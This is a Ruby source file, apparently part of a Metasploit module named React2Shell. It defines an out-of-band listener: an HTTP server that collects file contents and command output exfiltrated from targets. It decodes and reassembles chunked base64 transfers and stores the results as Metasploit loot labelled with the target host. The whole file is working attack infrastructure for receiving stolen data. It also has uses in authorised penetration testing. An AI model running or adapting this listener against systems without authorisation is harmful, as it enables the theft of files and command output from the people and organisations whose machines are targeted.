# frozen_string_literal: true

require 'socket'
require 'thread'
require 'base64'
require_relative 'session_manager'
require_relative 'error_handler'

module React2Shell
  ##
  # OOBListener - HTTP server for receiving Out-of-Band data exfiltration
  # Handles POST requests with files and command output
  # Now supports multiple concurrent sessions through SessionManager
  class OOBListener
    attr_reader :server_thread, :received_data, :server_host, :server_port, :session_manager, :error_handler

    def initialize(msf_module)
      @msf_module = msf_module
      @server_thread = nil
      @received_data = nil
      @server_socket = nil
      @running = false
      @session_manager = SessionManager.new(msf_module)
      @error_handler = ErrorHandler.new(msf_module)
    end

    ##
    # Starts the HTTP server for OOB data reception
    # @param host [String] Host to bind server to
    # @param port [Integer] Port to bind server to
    def start_server(host = nil, port = nil)
      @server_host = host || @msf_module.datastore['SRVHOST'] || @msf_module.datastore['LHOST'] || '0.0.0.0'
      @server_port = port || @msf_module.datastore['SRVPORT'] || 8080
      
      @received_data = nil
      @running = true
      
      @server_thread = Thread.new do
        run_http_server
      end
      
      # Give server time to start
      sleep(1)
      
      @msf_module.vprint_status("OOB HTTP server started on #{@server_host}:#{@server_port}")
    end

    ##
    # Stops the HTTP server and cleans up resources
    def stop_server
      @running = false
      
      if @server_socket
        @server_socket.close rescue nil
        @server_socket = nil
      end
      
      if @server_thread && @server_thread.alive?
        @server_thread.kill
        @server_thread = nil
      end
      
      # Clean up all sessions
      @session_manager.cleanup_all_sessions
      
      @msf_module.vprint_status("OOB HTTP server stopped")
    end

    ##
    # Handles incoming POST requests with data
    # @param request [Hash] Parsed HTTP request
    # @param source_ip [String] IP address of the client
    # @return [String] HTTP response
    def handle_post_request(request, source_ip = nil)
      body = request[:body] || ''
      headers = request[:headers] || {}
      content_type = headers['content-type'] || 'text/plain'
      
      @msf_module.print_good("Received POST data (#{body.length} bytes, #{content_type}) from #{source_ip}")
      
      # Parse different data formats
      parsed_data = parse_received_data(body)
      data_type = determine_data_type(body, content_type)
      
      # Handle chunked data specially
      if parsed_data.is_a?(Hash) && parsed_data[:is_chunk]
        # This is a chunk - add to session with chunk info
        chunk_info = {
          is_chunk: true,
          chunk_id: parsed_data[:chunk_id],
          chunk_index: parsed_data[:chunk_index],
          total_chunks: parsed_data[:total_chunks],
          expected_size: parsed_data[:expected_size]
        }
        
        success = @session_manager.add_data_to_session(source_ip, parsed_data[:data], parsed_data[:data_type], chunk_info)
        
        if success
          @msf_module.print_status("Successfully processed chunk #{parsed_data[:chunk_index] + 1}/#{parsed_data[:total_chunks]} from #{source_ip}")
          return build_http_response(200, 'OK', 'Chunk received successfully')
        else
          @msf_module.print_warning("Failed to process chunk from #{source_ip}")
          return build_http_response(500, 'Internal Server Error', 'Failed to process chunk')
        end
      else
        # Regular data handling
        success = @session_manager.add_data_to_session(source_ip, parsed_data, data_type)
        
        if success
          # Also store in legacy format for backward compatibility
          store_received_data(parsed_data, data_type)
          
          # Log successful data reception
          @msf_module.print_status("Successfully processed #{data_type} data from OOB callback")
          
          # Return simple OK response
          build_http_response(200, 'OK', 'Data received successfully')
        else
          @msf_module.print_warning("Failed to process data from #{source_ip}")
          build_http_response(500, 'Internal Server Error', 'Failed to process data')
        end
      end
    end

    ##
    # Stores received data with metadata and automatic Metasploit loot storage
    # @param data [String] Data to store
    # @param type [Symbol] Type of data (:file, :command, :raw)
    def store_received_data(data, type)
      @received_data = {
        content: data,
        type: type,
        timestamp: Time.now,
        size: data.length
      }
      
      # Automatically store as Metasploit loot
      store_as_metasploit_loot(data, type)
      
      @msf_module.vprint_status("Stored #{type} data: #{data.length} bytes")
    end

    ##
    # Stores data as Metasploit loot with appropriate categorization
    # @param data [String] Data to store as loot
    # @param type [Symbol] Type of data for loot categorization
    def store_as_metasploit_loot(data, type)
      return if data.nil? || data.empty?
      
      loot_type = case type
                  when :file
                    'react2shell.oob.file'
                  when :command
                    'react2shell.oob.cmd'
                  else
                    'react2shell.oob.data'
                  end
      
      begin
        loot_path = @msf_module.store_loot(
          loot_type,
          'text/plain',
          @msf_module.datastore['RHOSTS'] || 'unknown',
          data,
          "react2shell_#{type}_#{Time.now.to_i}.txt",
          "React2Shell OOB #{type} data"
        )
        
        @msf_module.print_good("Data saved to loot: #{loot_path}")
      rescue => e
        @msf_module.vprint_error("Failed to store loot: #{e.class}: #{e.message}")
      end
    end

    ##
    # Checks if any data has been received
    # @return [Boolean] True if data has been received
    def has_received_data?
      !@received_data.nil?
    end

    ##
    # Gets the received data content
    # @return [String] Received data content
    def get_received_data
      @received_data ? @received_data[:content] : nil
    end

    ##
    # Gets full received data with metadata
    # @return [Hash] Received data with metadata
    def get_received_data_with_metadata
      @received_data
    end

    ##
    # Gets the OOB callback URL for use in payloads
    # @return [String] The complete OOB URL
    def get_oob_url
      return nil unless @server_host && @server_port
      
      # Use external IP if binding to all interfaces
      host = @server_host == '0.0.0.0' ? (@msf_module.datastore['LHOST'] || @server_host) : @server_host
      "http://#{host}:#{@server_port}/"
    end

    ##
    # Checks if the server is currently running
    # @return [Boolean] True if server is running
    def running?
      @running && @server_thread && @server_thread.alive?
    end

    ##
    # Creates a new OOB session for a target
    # @param target_host [String] Target hostname or IP
    # @param expected_data_type [Symbol] Expected data type (:file, :command, :unknown)
    # @param source_info [String] Additional info about the data source
    # @return [OOBSession] The created session
    def create_session(target_host, expected_data_type = :unknown, source_info = nil)
      @session_manager.create_session(target_host, expected_data_type, source_info)
    end

    ##
    # Gets a session by ID
    # @param session_id [String] Session identifier
    # @return [OOBSession, nil] The session or nil if not found
    def get_session(session_id)
      @session_manager.get_session(session_id)
    end

    ##
    # Gets all active sessions
    # @return [Array<OOBSession>] Active sessions
    def get_active_sessions
      @session_manager.get_active_sessions
    end

    ##
    # Gets all completed sessions
    # @return [Array<OOBSession>] Completed sessions
    def get_completed_sessions
      @session_manager.get_completed_sessions
    end

    ##
    # Gets session statistics
    # @return [Hash] Statistics about sessions
    def get_session_statistics
      @session_manager.get_session_statistics
    end

    ##
    # Waits for any session to complete
    # @param timeout_seconds [Integer] Maximum time to wait
    # @return [OOBSession, nil] Completed session or nil if timeout
    def wait_for_session_completion(timeout_seconds = 30)
      @session_manager.wait_for_any_completion(timeout_seconds)
    end

    ##
    # Cleans up timed out sessions
    # @param timeout_seconds [Integer] Timeout in seconds
    # @return [Integer] Number of sessions cleaned up
    def cleanup_timed_out_sessions(timeout_seconds = 300)
      @session_manager.cleanup_timed_out_sessions(timeout_seconds)
    end

    private

    def run_http_server
      retry_count = 0
      max_retries = 3
      
      begin
        @server_socket = TCPServer.new(@server_host, @server_port)
        @msf_module.vprint_status("HTTP server listening on #{@server_host}:#{@server_port}")
        
        while @running
          begin
            # Use select with timeout to allow clean shutdown
            ready = IO.select([@server_socket], nil, nil, 1)
            next unless ready
            
            client = @server_socket.accept
            @msf_module.vprint_status("Accepted connection from #{client.peeraddr[3]}:#{client.peeraddr[1]}")
            Thread.new(client) { |socket| handle_client_connection(socket) }
          rescue => e
            break unless @running
            
            # Use centralized error handling for server accept errors
            error_info = @error_handler.handle_server_error(e, "client accept", nil)
            
            # Implement retry logic for network errors (requirement 4.3)
            if retry_count < max_retries && error_info[:is_recoverable]
              retry_count += 1
              sleep(@error_handler.send(:calculate_retry_delay, retry_count - 1))
              next
            else
              break
            end
          end
        end
      rescue => e
        # Use centralized error handling for server startup errors
        error_info = @error_handler.handle_server_error(e, "server startup", nil)
        
        # Implement retry logic for server startup failures (requirement 4.3)
        if retry_count < max_retries && error_info[:is_recoverable]
          retry_count += 1
          sleep(2)
          retry
        end
      ensure
        @server_socket.close if @server_socket
        @server_socket = nil
      end
    end

    ##
    # Determines if an error is a network-related error that should be retried
    # @param error [Exception] The error to check
    # @return [Boolean] True if the error is network-related
    def network_error?(error)
      network_error_classes = [
        Errno::ECONNRESET,
        Errno::ECONNREFUSED, 
        Errno::ETIMEDOUT,
        Errno::EHOSTUNREACH,
        Errno::ENETUNREACH,
        Errno::EADDRINUSE,
        SocketError
      ]
      
      network_error_classes.any? { |klass| error.is_a?(klass) }
    end

    def handle_client_connection(socket)
      client_info = "#{socket.peeraddr[3]}:#{socket.peeraddr[1]}"
      
      begin
        request = parse_http_request(socket)
        unless request
          @error_handler.handle_server_error(
            StandardError.new("Failed to parse HTTP request"),
            "request parsing",
            client_info
          )
          return
        end
        
        @msf_module.vprint_status("Processing #{request[:method]} request from #{client_info} to #{request[:path]}")
        
        response = case request[:method]
                  when 'POST'
                    handle_post_request(request, socket.peeraddr[3])
                  when 'GET'
                    # Handle GET requests with basic response
                    build_http_response(200, 'OK', 'React2Shell OOB Listener Active')
                  else
                    @msf_module.vprint_status("Unsupported method #{request[:method]} from #{client_info}")
                    build_http_response(405, 'Method Not Allowed')
                  end
        
        socket.write(response)
        @msf_module.vprint_status("Sent response to #{client_info}")
        
      rescue => e
        # Use centralized error handling for client connection errors
        @error_handler.handle_server_error(e, "client connection", client_info)
        
        # Send error response if socket is still open
        begin
          error_response = build_http_response(500, 'Internal Server Error')
          socket.write(error_response)
        rescue
          # Ignore errors when sending error response
        end
      ensure
        socket.close rescue nil
      end
    end

    def parse_http_request(socket)
      # Set socket timeout for reading
      socket.setsockopt(Socket::SOL_SOCKET, Socket::SO_RCVTIMEO, [30, 0].pack("l_2"))
      
      # Read request line
      request_line = socket.gets
      return nil unless request_line
      
      method, path, protocol = request_line.strip.split(' ')
      return nil unless method && path
      
      # Read headers
      headers = {}
      while (line = socket.gets)
        break if line.strip.empty?
        key, value = line.split(':', 2)
        headers[key.strip.downcase] = value.strip if key && value
      end
      
      # Read body if present - handle large data transfers
      body = ""
      if headers['content-length']
        length = headers['content-length'].to_i
        if length > 0
          # Handle large data in chunks to prevent memory issues
          if length > 1024 * 1024  # 1MB threshold
            @msf_module.vprint_status("Receiving large data transfer: #{length} bytes")
            body = read_large_body(socket, length)
          else
            body = socket.read(length)
          end
        end
      elsif headers['transfer-encoding'] == 'chunked'
        body = read_chunked_body(socket)
      end
      
      {
        method: method,
        path: path,
        headers: headers,
        body: body
      }
    end

    ##
    # Reads large HTTP body in chunks to prevent memory issues
    # @param socket [TCPSocket] The client socket
    # @param total_length [Integer] Total expected length
    # @return [String] The complete body content
    def read_large_body(socket, total_length)
      body = ""
      remaining = total_length
      chunk_size = 8192  # 8KB chunks
      chunks_received = 0
      
      while remaining > 0
        read_size = [chunk_size, remaining].min
        chunk = socket.read(read_size)
        break unless chunk
        
        # Verify chunk integrity
        unless verify_chunk_integrity(chunk, chunks_received)
          @msf_module.print_warning("Chunk integrity verification failed for chunk #{chunks_received}")
        end
        
        body += chunk
        remaining -= chunk.length
        chunks_received += 1
        
        # Log progress for very large transfers
        if total_length > 1024 * 1024  # 1MB threshold for progress logging
          progress = ((total_length - remaining).to_f / total_length * 100).round(1)
          @msf_module.vprint_status("Large data transfer progress: #{progress}% (#{chunks_received} chunks)")
        end
      end
      
      # Verify complete data integrity
      if verify_data_integrity(body, total_length)
        @msf_module.vprint_status("Large data transfer completed successfully: #{total_length} bytes in #{chunks_received} chunks")
      else
        @msf_module.print_warning("Data integrity verification failed for complete transfer")
      end
      
      body
    end

    ##
    # Reads chunked HTTP body with integrity verification
    # @param socket [TCPSocket] The client socket  
    # @return [String] The complete body content
    def read_chunked_body(socket)
      body = ""
      chunk_count = 0
      total_size = 0
      
      loop do
        # Read chunk size line
        size_line = socket.gets
        break unless size_line
        
        chunk_size = size_line.strip.to_i(16)
        break if chunk_size == 0
        
        # Read chunk data
        chunk_data = socket.read(chunk_size)
        if chunk_data
          # Verify chunk integrity
          unless verify_chunk_integrity(chunk_data, chunk_count)
            @msf_module.print_warning("Chunk integrity verification failed for HTTP chunk #{chunk_count}")
          end
          
          body += chunk_data
          chunk_count += 1
          total_size += chunk_data.length
          
          # Log progress for large chunked transfers
          if total_size > 1024 * 1024  # 1MB
            @msf_module.vprint_status("Chunked transfer progress: #{total_size} bytes in #{chunk_count} chunks")
          end
        end
        
        # Read trailing CRLF
        socket.gets
      end
      
      # Read trailing headers (if any)
      while (line = socket.gets)
        break if line.strip.empty?
      end
      
      # Verify complete chunked data integrity
      if verify_data_integrity(body, total_size)
        @msf_module.vprint_status("Chunked transfer completed successfully: #{total_size} bytes in #{chunk_count} chunks")
      else
        @msf_module.print_warning("Data integrity verification failed for chunked transfer")
      end
      
      body
    end

    def parse_received_data(raw_data)
      return '' if raw_data.nil? || raw_data.empty?
      
      # Handle chunked data formats
      if raw_data.start_with?('CHUNK:') || raw_data.start_with?('CMD_CHUNK:')
        return parse_chunked_data(raw_data)
      end
      
      # Handle special command output format
      if raw_data.start_with?('CMD_OUTPUT:')
        return raw_data[11..-1] # Remove "CMD_OUTPUT:" prefix
      end
      
      # Handle file content markers
      if raw_data.start_with?('FILE_CONTENT:')
        return raw_data[13..-1] # Remove "FILE_CONTENT:" prefix
      end
      
      # Handle error output
      if raw_data.start_with?('ERROR:')
        return raw_data[6..-1] # Remove "ERROR:" prefix
      end
      
      # Return raw data for other content
      raw_data
    end

    ##
    # Parses chunked data and handles reassembly
    # @param raw_data [String] Raw chunked data
    # @return [Hash] Parsed chunk information or original data
    def parse_chunked_data(raw_data)
      # Parse chunk format: CHUNK:chunk_id:index:total:size:data
      # or CMD_CHUNK:chunk_id:index:total:size:data
      parts = raw_data.split(':', 6)
      
      if parts.length >= 6
        chunk_type = parts[0]  # CHUNK or CMD_CHUNK
        chunk_id = parts[1]
        chunk_index = parts[2].to_i
        total_chunks = parts[3].to_i
        expected_size = parts[4].to_i
        encoded_data = parts[5]
        
        # Decode base64 data
        begin
          decoded_data = Base64.decode64(encoded_data)
        rescue => e
          @msf_module.print_error("Failed to decode chunk data: #{e.message}")
          return raw_data
        end
        
        # Determine data type from chunk type
        data_type = chunk_type == 'CMD_CHUNK' ? :command : :file
        
        # Handle multipart reassembly
        complete_data = handle_multipart_data(chunk_id, decoded_data, chunk_index, total_chunks)
        
        if complete_data
          # Return complete reassembled data
          @msf_module.print_good("Reassembled complete #{data_type} data: #{complete_data.length} bytes")
          return complete_data
        else
          # Return chunk info for session handling
          return {
            is_chunk: true,
            chunk_id: chunk_id,
            chunk_index: chunk_index,
            total_chunks: total_chunks,
            expected_size: expected_size,
            data: decoded_data,
            data_type: data_type
          }
        end
      else
        @msf_module.print_warning("Invalid chunk format received")
        return raw_data
      end
    end

    def determine_data_type(raw_data, content_type = 'text/plain')
      return :chunk if raw_data.is_a?(Hash) && raw_data[:is_chunk]
      return :command if raw_data.start_with?('CMD_OUTPUT:') || raw_data.start_with?('CMD_CHUNK:')
      return :file if raw_data.start_with?('FILE_CONTENT:') || raw_data.start_with?('CHUNK:')
      return :error if raw_data.start_with?('ERROR:')
      
      # Determine type based on content type header
      case content_type.downcase
      when /application\/octet-stream/, /application\/x-.*/, /image\/.*/, /video\/.*/, /audio\/.*/
        :file
      when /text\/.*/, /application\/json/, /application\/xml/
        raw_data.length > 0 ? :file : :raw
      else
        raw_data.length > 0 ? :file : :raw
      end
    end

    def build_http_response(code, message, body = message)
      response = "HTTP/1.1 #{code} #{message}\r\n"
      response += "Content-Type: text/plain\r\n"
      response += "Content-Length: #{body.length}\r\n"
      response += "Connection: close\r\n"
      response += "\r\n"
      response += body
      response
    end

    ##
    # Verifies integrity of individual data chunks
    # @param chunk [String] The chunk data to verify
    # @param chunk_index [Integer] Index of the chunk for logging
    # @return [Boolean] True if chunk appears valid
    def verify_chunk_integrity(chunk, chunk_index)
      return false if chunk.nil?
      return true if chunk.empty?  # Empty chunks are valid
      
      # Basic integrity checks
      # Check for null bytes that might indicate corruption
      if chunk.include?("\x00") && !chunk.start_with?("FILE_CONTENT:")
        @msf_module.vprint_warning("Chunk #{chunk_index} contains null bytes - possible corruption")
        return false
      end
      
      # Check for reasonable chunk size (not too large for memory)
      if chunk.length > 10 * 1024 * 1024  # 10MB per chunk
        @msf_module.vprint_warning("Chunk #{chunk_index} is unusually large: #{chunk.length} bytes")
        return false
      end
      
      true
    end

    ##
    # Verifies integrity of complete data transfer
    # @param data [String] Complete data to verify
    # @param expected_size [Integer] Expected size in bytes
    # @return [Boolean] True if data appears valid and complete
    def verify_data_integrity(data, expected_size)
      return false if data.nil?
      
      # Check size matches expectation
      if data.length != expected_size
        @msf_module.vprint_warning("Data size mismatch: expected #{expected_size}, got #{data.length}")
        return false
      end
      
      # For large data, perform additional integrity checks
      if data.length > 1024 * 1024  # 1MB
        # Check for patterns that might indicate corruption
        # Look for repeated null bytes or other corruption indicators
        null_byte_sequences = data.scan(/\x00{10,}/).length
        if null_byte_sequences > 0
          @msf_module.vprint_warning("Large data contains #{null_byte_sequences} sequences of null bytes")
        end
        
        # Check for reasonable character distribution (not all same character)
        unique_chars = data.chars.uniq.length
        if unique_chars < 10 && data.length > 10000
          @msf_module.vprint_warning("Large data has low character diversity: #{unique_chars} unique characters")
        end
      end
      
      true
    end

    ##
    # Handles reassembly of multi-part data transfers
    # @param session_id [String] Session identifier for tracking parts
    # @param part_data [String] Data for this part
    # @param part_index [Integer] Index of this part (0-based)
    # @param total_parts [Integer] Total expected parts
    # @return [String, nil] Complete data if all parts received, nil otherwise
    def handle_multipart_data(session_id, part_data, part_index, total_parts)
      @multipart_sessions ||= {}
      
      # Initialize session if not exists
      unless @multipart_sessions[session_id]
        @multipart_sessions[session_id] = {
          parts: Array.new(total_parts),
          received_count: 0,
          start_time: Time.now,
          total_size: 0
        }
      end
      
      session = @multipart_sessions[session_id]
      
      # Store this part
      if part_index >= 0 && part_index < total_parts && session[:parts][part_index].nil?
        session[:parts][part_index] = part_data
        session[:received_count] += 1
        session[:total_size] += part_data.length
        
        @msf_module.vprint_status("Multipart session #{session_id}: received part #{part_index + 1}/#{total_parts} (#{part_data.length} bytes)")
      end
      
      # Check if all parts received
      if session[:received_count] == total_parts
        # Reassemble complete data
        complete_data = session[:parts].join
        duration = Time.now - session[:start_time]
        
        @msf_module.print_good("Multipart transfer complete: #{session[:total_size]} bytes in #{total_parts} parts (#{duration.round(2)}s)")
        
        # Verify reassembled data integrity
        if verify_data_integrity(complete_data, session[:total_size])
          # Clean up session
          @multipart_sessions.delete(session_id)
          return complete_data
        else
          @msf_module.print_error("Multipart data integrity verification failed")
          @multipart_sessions.delete(session_id)
          return nil
        end
      end
      
      nil  # Not all parts received yet
    end

    ##
    # Cleans up stale multipart sessions
    # @param timeout_seconds [Integer] Timeout for stale sessions
    def cleanup_stale_multipart_sessions(timeout_seconds = 300)
      return unless @multipart_sessions
      
      current_time = Time.now
      stale_sessions = []
      
      @multipart_sessions.each do |session_id, session|
        if current_time - session[:start_time] > timeout_seconds
          stale_sessions << session_id
        end
      end
      
      stale_sessions.each do |session_id|
        @msf_module.vprint_warning("Cleaning up stale multipart session: #{session_id}")
        @multipart_sessions.delete(session_id)
      end
      
      stale_sessions.length
    end
  end
end